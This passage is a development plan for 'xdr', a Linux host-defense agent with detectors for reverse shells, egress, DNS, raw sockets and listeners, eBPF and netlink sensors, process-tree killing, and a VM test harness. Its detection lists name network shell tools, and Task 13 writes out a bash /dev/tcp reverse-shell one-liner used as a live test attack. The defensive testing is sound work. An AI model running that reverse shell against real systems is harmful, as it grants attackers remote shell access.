	Count    int                    // identical incidents folded into this line
}
type Log struct{ /* file, window, clock */ }
func Open(path string, window time.Duration) (*Log, error) // parent dir 0700, file 0600, append
func (l *Log) Add(in Incident) (written bool, err error)
func Read(r io.Reader) ([]Incident, error)
```
JSON field names are the lower-case Go names. `Add` folds an incident with the same (Kind, Action, Exe, UID, Remote, Detail) as one written less than `window` ago: nothing is written and a counter grows; the first write after the window carries `Count`. Every string is cut to 4096 bytes before encoding. `xdr incidents [--file PATH]` (default `/var/lib/xdr/incidents.jsonl`) prints one line per incident — `TIME SEV kind action pid=N exe → addr:port detail` — every field through `printable`.

- [ ] **Step 1: Write the failing tests**: `TestLog_HostileFieldsOneLine` (comm `a\nb`, cmdline `["\x1b[2J", "\xff\xfe", <100 kB>]` → the file holds exactly one `\n`, `Read` returns one incident, no string over 4096 bytes); `TestLog_Dedupe` (same incident three times inside the window with a fake clock → one line; a fourth after the window → second line with `Count==3`); `TestLog_DifferentRemoteNotFolded`; `TestLog_Perms` (file 0600, dir 0700); `TestLog_AppendsAcrossReopen`; in cli: `TestPrint_EscapesControlBytes` (an incident whose exe is `/tmp/\x1b[31mx\n` prints one line with no raw `\x1b`).
- [ ] **Step 2: Run** `go test ./internal/incident ./internal/cli` — Expected: FAIL (`Open` undefined).
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** `go test ./internal/incident ./internal/cli` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: incident log with folding and safe printing"`

### Task 8: Detectors

**Files:**
- Create: `internal/detect/policy.go`, `internal/detect/detect.go`, `internal/sensor/sensor.go` (types only)
- Test: `internal/detect/policy_test.go`, `internal/detect/detect_test.go`

**Interfaces:**
- Consumes: `proc.Snapshot`, `proc.Proc`, `proc.ExeHash`, `config.Config`, `baseline.Baseline` (`Files[pathenc.Encode(path)].SHA256`), `incident.Endpoint`.
- Produces, in `sensor`:

```go
type Kind int // Exec, Connect, Send, Socket
type Event struct {
	Kind      Kind
	PID, PPID int            // PPID 0 when the source does not know it
	UID       uint32
	Comm, Filename string    // Filename: exec path, "" when unknown
	Dst       netip.AddrPort // Connect, Send (unmapped)
	Proto     string         // "tcp", "udp"
	Family, SockType int     // Socket
}
type Source interface { Name() string; Events() <-chan Event; Close() error }
```

- Produces, in `detect`:

```go
type Policy struct {
	Cfg   *config.Config
	Base  *baseline.Baseline            // composed layers; nil: nothing is baseline
	Gray  map[uint32]bool               // uids of cfg.GrayUsers
	Self  int                           // the agent's pid
	Local func(netip.Addr) bool         // an address of this host
	Hash  func(*proc.Proc) string       // "" on error
}
func (p *Policy) AllowedOut(dst netip.AddrPort, proto string) bool
func (p *Policy) Baseline(pr *proc.Proc) bool
func (p *Policy) Guarded(s *proc.Snapshot, pr *proc.Proc) bool
func (p *Policy) IsGray(s *proc.Snapshot, pr *proc.Proc) bool
func Class(pr *proc.Proc) string         // "shell", "interp", "nettool" or ""

type Detection struct {
	Kind     string          // revshell-stdio | service-shell | egress | dns | rawsock | listener
	PID      int
	Start    uint64
	Severity model.Severity
	Remote   *incident.Endpoint
	Detail   string
	NoKill   bool
}
func Sweep(s *proc.Snapshot, p *Policy) []Detection
func Event(ev sensor.Event, s *proc.Snapshot, p *Policy) []Detection
```

Definitions the tests pin:
- `Class` goes by the base name of `Exe` (of `Comm` when `Exe` is empty). shell: `sh bash dash zsh ksh ash tcsh csh fish busybox`. interp: names starting `python`, `perl`, `ruby`, `php`, `lua`, and `node nodejs gawk`. nettool: `nc ncat netcat nc.openbsd nc.traditional socat telnet openssl`.
- `AllowedOut` (a v4-mapped IPv6 address is unmapped first): loopback, `Local`, multicast and limited broadcast; jump or peer on an `xdr_ports` tcp port; an `allow_out` entry; udp 68→67 when `dhcp`.
- `Baseline`: not in a container, exe not deleted, and the baseline entry for `Exe` has the same SHA-256 as `Hash(pr)`.
- `Guarded`: `Exe` is in `guard_exes`, or the process holds a listening socket on a scored port.
- `IsGray`: the uid of the process or of any process in its chain is in `Gray`.
- `revshell-stdio` (Critical): class shell or interp and fd 0, 1 or 2 is an `AF_INET`/`AF_INET6` socket. Remote is that socket's peer.
- `service-shell` (High): class shell or nettool, and some ancestor is `Guarded`, holds a listening inet socket and is not `sshd`. (A container runtime shim is guarded but listens on nothing, so a container's entrypoint shell is not flagged.)
- `egress` (High): a tcp socket that is `SynSent`, or connected with a local port no socket in that netns listens on, or a connected udp socket — with a remote that is not `AllowedOut`. From an event: `Connect` or `Send` to such a destination. Destination port 53 or 853 makes it `dns` instead.
- `rawsock` (High): holds an `AF_PACKET` socket or a `raw` one.
- `listener` (High): a tcp `Listen` socket, or a bound udp socket with port below 32768, whose port is not scored, not matched by a `listeners` entry (proto, port, exe), and whose holder is not `docker-proxy`. Reported once, on the holder whose parent does not hold the same inode. A loopback-only listener is Low with `NoKill`.
- The agent's own pid and kernel threads are never a subject. An `Exec` event is classed by its `Filename`, not by what the pid runs now: a shell that has already exec'd its command is still reported on that pid, and one whose pid is gone is judged from `Filename`, `Comm` and the chain of `PPID`, with Detail ending ` (exited)`.

- [ ] **Step 1: Write the failing tests.** Build snapshots in Go literals (helper `snap(procs…, socks…)`); `Hash` and `Local` are stubs.
  - `TestClass`: `/usr/bin/bash`→shell, `/usr/bin/python3.12`→interp, `/usr/bin/nc.openbsd`→nettool, `/usr/sbin/apache2`→``.
  - `TestAllowedOut_V4MappedAndOwnAddress`: `[::ffff:192.0.2.4]:7443` is allowed; the host's own `192.0.2.5`:3306 allowed; `203.0.113.9`:443 not; peer on port 22 not.
  - `TestBaseline_PathAndHash`: same path and hash → true; same path, other hash → false; container cgroup → false; `ExeDeleted` → false; nil `Base` → false.
  - `TestSweep_RevshellStdio`: bash with fd 0–2 on a tcp socket to `203.0.113.9:4444` → one Critical detection with that remote; bash on a pty → none; bash with fd 0 on a `unix` socket → none.
  - `TestSweep_ServiceShell`: apache2 (guarded, listening :80) → sh → detection on sh; shim (guarded, no listener) → sh → none; sshd listening on scored :22 → bash → none.
  - `TestSweep_Egress`: `SynSent` to stranger → egress; an accepted connection on listening port 80 from stranger → none; connected to peer:7443 → none; udp connected to `203.0.113.53:53` → kind `dns`.
  - `TestSweep_RawSock`, `TestSweep_Listener` (unknown tcp :4444 → High; scored :80 → none; config-listed udp/68 networkd → none; same port but another exe → High; `docker-proxy` → none; udp :40000 → none; `127.0.0.1:9000` → Low, `NoKill`; forked holders → one detection on the parent).
  - `TestSweep_IgnoresSelfAndKernelThreads`.
  - `TestEvent_ConnectDenied` / `TestEvent_ConnectAllowed` / `TestEvent_SendToPort53IsDNS`.
  - `TestEvent_ExecShellThatExecedOn`: event `Filename:"/bin/sh"`, the pid now runs `/usr/bin/sleep` under an apache worker → `service-shell` on that pid with its `Start`.
  - `TestEvent_ExecOfExitedServiceShell`: pid absent from the snapshot, `Filename:"/bin/sh"`, `PPID` an apache worker → `service-shell`, Detail ends ` (exited)`.
- [ ] **Step 2: Run** `go test ./internal/detect` — Expected: FAIL (`Sweep` undefined).
- [ ] **Step 3: Implement** `sensor.go` (types), `policy.go`, `detect.go`.
- [ ] **Step 4: Run** `go test ./internal/detect ./internal/sensor` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: reverse-shell, egress, DNS, raw-socket and listener detectors"`

### Task 9: Decide and kill

**Files:**
- Create: `internal/respond/kill.go`
- Test: `internal/respond/kill_test.go`

**Interfaces:**
- Consumes: `detect.Detection`, `detect.Policy`, `detect.Class`, `proc.Snapshot`, `proc.Read`.
- Produces:

```go
func Decide(d detect.Detection, s *proc.Snapshot, p *detect.Policy) string // "kill" | "held" | "alert"
var ErrGone = errors.New("process gone or pid reused")
func KillTree(procRoot string, pid int, start uint64, protect func(*proc.Proc) bool) (killed []int, err error)
```

`Decide`, first match:

| # | condition | result |
|---|---|---|
| 1 | `d.NoKill`, or the process is no longer in the snapshot | alert |
| 2 | `Guarded` | held |
| 3 | kind `revshell-stdio` or `service-shell` | kill |
| 4 | `IsGray` | alert |
| 5 | `Baseline` and `Class == ""` | alert |
| 6 | otherwise | kill |

`KillTree` (the order matters and tests cannot fully pin it):
1. `proc.Read(procRoot)`; if `pid` is absent or its `Start` differs from `start` → `ErrGone`, nothing signalled.
2. Targets: `pid` and its descendants, minus pid 1, kernel threads, `os.Getpid()` and any process `protect` returns true for. Ancestors are never targets.
3. For each target (parents first): `unix.PidfdOpen`, re-read its start time from `<pid>/stat`; mismatch → drop it. `SIGSTOP` through the pidfd.
4. Read `/proc` once more; stop any new descendant of a target the same way (it forked before the stop).
5. `SIGKILL` every target through its pidfd. `ESRCH` is success.

- [ ] **Step 1: Write the failing tests.**
  - `TestDecide`: guarded + egress → held; guarded + revshell-stdio → held; gray + egress → alert; gray + revshell-stdio → kill; baseline `/usr/bin/curl` + egress → alert; baseline `/usr/bin/bash` + egress → kill; non-baseline + listener → kill; baseline networkd + listener → alert; baseline `/usr/bin/nc.openbsd` + listener → kill; `NoKill` → alert; container process + egress → kill; sh under apache + service-shell → kill.
  - Kill tests spawn real processes with `exec.Command("sh", "-c", …)` and reap them:
    - `TestKillTree_KillsWholeBranch`: `sh -c 'sleep 60 & sleep 60 & wait'` → all three pids gone within 2 s, `killed` has three entries.
    - `TestKillTree_LeavesParentAndSiblings`: a parent `sh` with two such branches; kill one → parent and the other branch still run.
    - `TestKillTree_PidReused`: correct pid with `start+1` → `ErrGone`, process still running.
    - `TestKillTree_ProtectedSkipped`: `protect` true for one child → that child runs on, the rest die.
    - `TestKillTree_AlreadyExited`: a reaped pid → `ErrGone`, no panic.
    - `TestKillTree_ForkerCannotOutrun`: `sh -c 'while :; do sleep 0.01 & done'` → 1 s after the kill no process has that pid as ancestor or the sh as session leader.
- [ ] **Step 2: Run** `go test ./internal/respond` — Expected: FAIL (`KillTree` undefined).
- [ ] **Step 3: Implement** `kill.go`.
- [ ] **Step 4: Run** `go test -count=3 ./internal/respond` — Expected: PASS three times (no flakes).
- [ ] **Step 5: Commit** — `git commit -m "feat: kill a process subtree behind the scored-service guard"`

### Task 10: Exec events without eBPF (proc connector)

**Files:**
- Create: `internal/sensor/procconn.go`
- Test: `internal/sensor/procconn_test.go`

**Interfaces:**
- Consumes: `sensor.Event`, `sensor.Source`.
- Produces: `func NewProcConn() (Source, error)` — `Name()` is `"proc"`; emits `Exec` events carrying only `PID`. `func parseProcEvent(b []byte) (Event, bool)` (unexported, tested).

Netlink family `NETLINK_CONNECTOR`, group `CN_IDX_PROC`; subscribe by sending `PROC_CN_MCAST_LISTEN`. Payload: `cn_msg` (20 bytes: idx, val, seq, ack u32; len, flags u16) then `proc_event` (what u32, cpu u32, timestamp u64, then for `PROC_EVENT_EXEC` = 0x2: pid u32, tgid u32; 44 bytes in all). Report `tgid`. `ENOBUFS` on receive is not fatal (the sweep covers the gap). The channel is buffered (1024) and drops when full.

- [ ] **Step 1: Write the failing tests**: `TestParseProcEvent_Exec` (hand-built 44-byte message, tgid 4242 → `Event{Kind: Exec, PID: 4242}`); `TestParseProcEvent_OtherAndShort` (fork event, 10-byte slice → `false`); `TestKernel_ProcConnSeesExec` (root: start the source, run `/bin/true`, an `Exec` event with that pid arrives within 2 s).
- [ ] **Step 2: Run** `go test ./internal/sensor` — Expected: FAIL (`parseProcEvent` undefined).
- [ ] **Step 3: Implement** with `github.com/mdlayher/netlink`.
- [ ] **Step 4: Run** `go test ./internal/sensor && sudo -E "$(command -v go)" test -run Kernel ./internal/sensor` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: exec events from the netlink proc connector"`

### Task 11: eBPF sensor

**Files:**
- Create: `internal/sensor/bpf/sensor.c`, `internal/sensor/ebpf.go`, generated `internal/sensor/sensor_x86_bpfel.go` and `.o` (committed)
- Modify: `Makefile` (`bpf` target), `go.mod`
- Test: `internal/sensor/ebpf_test.go`

**Interfaces:**
- Consumes: `sensor.Event`, `sensor.Source`.
- Produces: `func NewEBPF(cgroupPath string) (Source, error)` — `Name()` is `"ebpf"`; production path `/sys/fs/cgroup`. Any load or attach error closes what was attached and is returned. `func decode(b []byte) (Event, bool)` (unexported, tested).

Programs, all observe-only (cgroup programs return 1), writing to one 1 MiB ring buffer `events`:

| section | event | notes |
|---|---|---|
| `tracepoint/sched/sched_process_exec` | Exec | pid = tgid; ppid by CO-RE read of `task->real_parent->tgid`; filename from the tracepoint's `__data_loc` field |
| `cgroup/connect4`, `cgroup/connect6` | Connect | destination from `user_ip4`/`user_ip6`, `user_port`; skipped in-kernel for `127.0.0.0/8` and `::1` |
| `cgroup/sendmsg4`, `cgroup/sendmsg6` | Send | same skip |
| `tracepoint/syscalls/sys_enter_socket` | Socket | only when family is `AF_PACKET` or the type's low 4 bits are `SOCK_RAW` |

Wire format (little endian, 184 bytes):

```c
struct event {
	__u32 kind;            /* 1 exec, 2 connect, 3 send, 4 socket */
	__u32 pid, ppid, uid;
	__u16 family, type;    /* connect/send: type holds the IP protocol */
	__u16 port;            /* host order */
	__u16 pad;
	__u8  addr[16];        /* IPv4 in the first 4 bytes */
	char  comm[16];
	char  filename[128];
};
```
Kernel structs are declared minimally in `sensor.c` with `__attribute__((preserve_access_index))` (only the fields read), so no `vmlinux.h` is checked in.

- [ ] **Step 1: Install the build toolchain on the dev box** (not on targets): `sudo apt-get install -y clang llvm libbpf-dev`; `go get github.com/cilium/ebpf@v0.22.0 && go get -tool github.com/cilium/ebpf/cmd/bpf2go`. Expected: `clang --version` prints a version.
- [ ] **Step 2: Write the failing tests**: `TestDecode_Connect4` (184 bytes with kind 2, pid 77, family `AF_INET`, type 6, port 4444, addr `203.0.113.9` → `Event{Kind: Connect, PID: 77, Proto: "tcp", Dst: 203.0.113.9:4444}`); `TestDecode_Exec` (comm and filename NUL-terminated inside their fields); `TestDecode_ShortOrUnknownKind` → `false`. Root tests, each against `NewEBPF("/sys/fs/cgroup")` with a 2 s wait:
  - `TestKernel_EBPF_Exec`: run `/bin/true` → Exec with `Filename=="/bin/true"`, `PPID==os.Getpid()`.
  - `TestKernel_EBPF_ConnectUDP`: `net.Dial("udp", "192.0.2.1:9")` (no packet leaves) → Connect, `Proto=="udp"`, that destination, `PID==os.Getpid()`.
  - `TestKernel_EBPF_Send`: in an unshared netns, `WriteTo` `192.0.2.1:53` (fails, unreachable) → Send event with port 53.
  - `TestKernel_EBPF_LoopbackSkipped`: dial `127.0.0.1:9` udp → no event in 500 ms.
  - `TestKernel_EBPF_RawSocket`: `unix.Socket(AF_PACKET, SOCK_RAW, 0)` → Socket with `Family==AF_PACKET`.
- [ ] **Step 3: Run** `go test ./internal/sensor` — Expected: FAIL (`decode` undefined).
- [ ] **Step 4: Write `sensor.c` and `ebpf.go`**; `ebpf.go` carries `//go:generate go tool bpf2go -target amd64 -cc clang -cflags "-O2 -g -Wall -I/usr/include/x86_64-linux-gnu" sensor bpf/sensor.c`. Add `bpf:` to the Makefile running `go generate ./internal/sensor`. Run `make bpf`. Expected: the two generated files exist.
- [ ] **Step 5: Run** `go test ./internal/sensor && sudo -E "$(command -v go)" test -count=1 -run Kernel ./internal/sensor` — Expected: PASS, no skips under sudo. `make build` on a shell with `PATH` stripped of clang still succeeds.
- [ ] **Step 6: Commit** (source and generated files) — `git commit -m "feat: eBPF exec, connect, sendmsg and raw-socket events"`

### Task 12: The agent

**Files:**
- Create: `internal/agent/agent.go`
- Modify: `internal/cli/agent.go`, `internal/cli/cli.go` (subcommands `agent`, `listeners`)
- Test: `internal/agent/agent_test.go`, `internal/cli/agent_test.go`

**Interfaces:**
- Consumes: everything produced by Tasks 1–11; `baseline.Embedded`, `baseline.Load`, `baseline.Compose`; `collect.ParsePasswd` (user names and gray uids).
- Produces:

```go
type Options struct {
	ConfigPath string
	Baselines  []string  // extra layers over the embedded one
	Sensor     string    // "auto" (default) | "ebpf" | "proc" | "none"
	LogPath    string    // default /var/lib/xdr/incidents.jsonl
	Stderr     io.Writer // sensor and reload messages
	OnIncident func(incident.Incident) // called for every line written; the cli prints it escaped
}
func Run(ctx context.Context, o Options) error

// unexported, tested with fakes:
type firewall interface { Apply(fw.Ruleset) error; Drifted() (bool, error) }
type agent struct { /* cfg, policy, log, firewall, kill func, clock, last ruleset, last snapshot */ }
func (a *agent) handle(s *proc.Snapshot, ds []detect.Detection)
func (a *agent) guard()                    // firewall and DNS files
func (a *agent) onQuery(q dnsguard.Query)
func openSensor(mode string, ebpf, procconn func() (sensor.Source, error), logf func(string, ...any)) sensor.Source
```

Behaviour:
- Start order: config, baselines, firewall `Apply`, `dnsguard.Assert`, stub on `dns.listen`, sensor, one sweep at once, then the loops (sweep 1 s, `guard` 3 s). A stub that cannot bind is an incident (`dns-stub`, alert) and the agent carries on.
- `openSensor`: `auto` tries eBPF, then the proc connector, then runs sweep-only; it logs exactly one line: `sensor: ebpf`, `sensor: proc (ebpf: <error>)` or `sensor: none (…)`. A forced mode that fails falls through the same way.
- `handle`: `respond.Decide`; `kill` → `KillTree` with `protect` = guarded or the agent itself; action `killed`, or `would-kill` when `kill` is false, `alert` with Detail ending ` (exited)` on `ErrGone`, `kill-failed` on another error; `held` and `alert` as decided. The incident carries process fields, `SHA256` from `Policy.Hash`, `Chain`, `Origin`, `Container`, `User`, `Remote`. Detections for one pid are handled most severe first; once that pid is killed its other detections are logged `killed` without a second kill. Every incident the log writes is passed to `OnIncident` (the cli prints it with the Task 7 formatter).
- `guard`: builds `fw.Build(cfg, now)`. If its `String()` differs from the last applied one (DNS switch, expiry or reload) → `Apply`, no incident. Else if `Drifted()` → `Apply` and an incident `fw-drift` / `repaired`. Then `dnsguard.Assert`; each changed path is an incident `dns-files` / `repaired`.
- `onQuery` (the stub calls `OnQuery` before it replies, so the asker is still there): find the asker with `UDPOwner` on a snapshot at most 200 ms old. Name not allowed → incident `dns-query` / `alert`, Medium, High when `Score` ≥ 3, Detail `name=<name> type=<n> <reasons>`. Allowed and score < 3 → nothing.
- `SIGHUP` reloads the config (a bad file is logged and the old one kept). `SIGTERM`/`SIGINT` close the sensor and stub and return nil; the table and the pinned files stay.
- `xdr agent --config F [--baseline B]… [--sensor M] [--log P]`. `xdr listeners [--config F]` prints the current listeners that are not scored (loopback ones too, so they can be silenced) as a JSON array of `{"proto","port","exe"}`.

- [ ] **Step 1: Write the failing tests** (fake firewall, fake kill, fake clock, snapshots as literals):
  - `TestHandle_KillWritesIncident`: an egress detection on a non-baseline process → kill called with its pid and start; incident `killed` with Remote, Chain of 3, Origin `ssh`.
  - `TestHandle_KillFalseIsWouldKill`; `TestHandle_GuardedHeld` (kill not called); `TestHandle_ErrGoneIsAlert`; `TestHandle_KillErrorIsKillFailed`.
  - `TestHandle_TwoDetectionsOnePidOneKill`: `revshell-stdio` and `egress` on one pid → kill called once, two incidents, both `killed`.
  - `TestHandle_ProtectCoversGuardedAndSelf`: the `protect` passed to kill is true for a guarded process and for `Self`, false for an ordinary one.
  - `TestRun_FallsBackWhenEBPFFails`: eBPF constructor errors, proc connector works → source name `proc`, log line starts `sensor: proc (ebpf:`; both fail → nil source, `sensor: none`.
  - `TestGuard_DriftRepairedAndLogged`; `TestGuard_DNSExpiryReappliesWithoutDriftIncident` (clock passes `Expires` → `Apply` called with a ruleset lacking the mark rule; no `fw-drift` line); `TestGuard_ChangedFilesLogged`.
  - `TestOnQuery_BlockedNameNamesProcess` (asker holds udp local port 40001 → incident PID and Exe are the asker's, Detail has the name); `TestOnQuery_AllowedIsQuiet`; `TestOnQuery_AllowedButScoredAlerts`.
  - `TestListenersCmd`: with a listener the test opens on `0.0.0.0:0`, the output parses as JSON and has that port with the test binary's path.
- [ ] **Step 2: Run** `go test ./internal/agent ./internal/cli` — Expected: FAIL (`agent` undefined).
- [ ] **Step 3: Implement** `agent.go` and the two subcommands.
- [ ] **Step 4: Run** `go test ./... && make test-root` — Expected: PASS.
- [ ] **Step 5: Commit** — `git commit -m "feat: xdr agent ties firewall, DNS, sensors and response together"`

### Task 13: 24.04 VM, live attacks

**Files:**
- Create: `test/vm/e2e-net.sh`, `test/vm/svc.py`
- Modify: `Makefile` (`e2e-net: build` → `test/vm/e2e-net.sh`), `docs/superpowers/specs/2026-11-10-xdr-design.md`

Setup: launch the VM as `e2e.sh` does (commands go over `lxc exec`, which does not use the network, so the table cannot lock the test out). `HOST` is the LXD bridge address (`lxc network get lxdbr0 ipv4.address`) and stands for jump box, attacker and resolver. Capture a baseline in the VM first so stock binaries count as baseline. `svc.py` is the scored service on tcp/80: it answers `GET /` with 200 and on `GET /run` starts `sh -c 'sleep 300; true'` (the `; true` keeps dash from exec'ing straight into `sleep`). The VM keeps the name `e2e.sh` uses (`xdr-e2e`). Config: `jump: [HOST]`, `scored: tcp/80`, `listeners`: sshd tcp/22 and networkd udp/68, `dns.resolver: HOST`, `dns.hosts: {"scoring.test": "192.0.2.10"}`. The script prints `ok <case>` / `FAIL <case>` and ends with `E2E-NET PASS` or exit 1.

| case | action | expected |
|---|---|---|
| `sensor-ebpf` | start the agent | stderr has `sensor: ebpf` |
| `scored-reachable` | host → VM:80, at start and after every other case | 200 |
| `listener` | `python3 -m http.server 4444` in the VM | host cannot connect; process gone in 3 s; incident `listener` `killed` |
| `revshell` | host listens on `HOST:4444`; VM runs `bash -c 'bash -i >& /dev/tcp/HOST/4444 0>&1'` | host accepts nothing in 5 s; no such bash after 3 s; incident `egress` `killed` with remote `HOST:4444` and a chain |
| `pre-existing-revshell` | agent stopped and `xdr fw remove`; the reverse shell connects; agent started | shell gone in 5 s; incident `revshell-stdio` `killed`; host side gets no further data |
| `service-shell` | host → VM:80 `/run` | `sh` and `sleep 300` gone in 3 s; incident `service-shell` `killed`; `svc.py` pid unchanged |
| `dns-off` | `getent hosts scoring.test`; `getent hosts example.com`; a hand-built query for `evil.example` to `127.0.0.1:53`; a udp send to `203.0.113.53:53` | `192.0.2.10`; fails in under 2 s; NXDOMAIN and incident `dns-query` naming python3 and `evil.example`; incident `dns` |
| `dns-on` | config `enabled`, `allow: ["xdr-e2e.lxd"]`, `SIGHUP` | `getent hosts xdr-e2e.lxd` resolves; `getent hosts other.lxd` fails with an incident |
| `dns-expiry` | `expires` 5 s ahead, `SIGHUP`, wait 9 s | `getent hosts xdr-e2e.lxd` fails |
| `rawsock` | python holds an `AF_PACKET` socket | gone in 3 s; incident `rawsock` `killed` |
| `drift` | `xdr fw remove`; overwrite the `hosts:` line of nsswitch | within 6 s: incidents `fw-drift` and `dns-files`, both `repaired`; egress to `HOST:4444` still times out |
| `agent-dead` | `kill -9` the agent | VM → `HOST:4444` times out; host → VM:80 is 200 |
| `fallback` | agent with `--sensor proc`; the `revshell` case again | stderr `sensor: proc`; bash gone in 4 s; incident `killed` |
| `incidents` | `xdr incidents` | exit 0; one line per incident above; no raw control bytes |

- [ ] **Step 1: Write** `svc.py` and `e2e-net.sh` with the cases above.
- [ ] **Step 2: Run** `sg lxd -c "make e2e-net" > .superpowers/sdd/e2e-net-run1.log 2>&1` (in the background; several minutes) — Expected: last line `E2E-NET PASS`, exit 0. A `FAIL` line is a defect in the agent or in the case: find the cause (superpowers:systematic-debugging), fix it under a unit test where one can reproduce it, rerun.
- [ ] **Step 3: Prove the script can fail**: set `kill: false` in the VM config, rerun — Expected: `FAIL revshell` (`would-kill`). Restore.
- [ ] **Step 4: Run** `go test ./... && make test-root && sg lxd -c "make e2e"` — Expected: all pass (Plan 1's harness still green).
- [ ] **Step 5: Record the decisions in the spec**: add the "Calls made in this plan" items to §6.1 (listener and raw-socket rule, service-shell definition, udp listener port bound) and §8 (always-on stub, NXDOMAIN, socket mark, reply-direction rule, `fw try`), marked as builder's calls.
- [ ] **Step 6: Commit** — `git commit -m "test: live-attack VM harness for the agent; spec records plan 2 decisions"`

---

## Done when

`go test ./...`, `make test-root`, `sg lxd -c "make e2e"` and `sg lxd -c "make e2e-net"` all pass on the branch, and `CGO_ENABLED=0 make build` produces one static `bin/xdr` that needs nothing installed on a target.
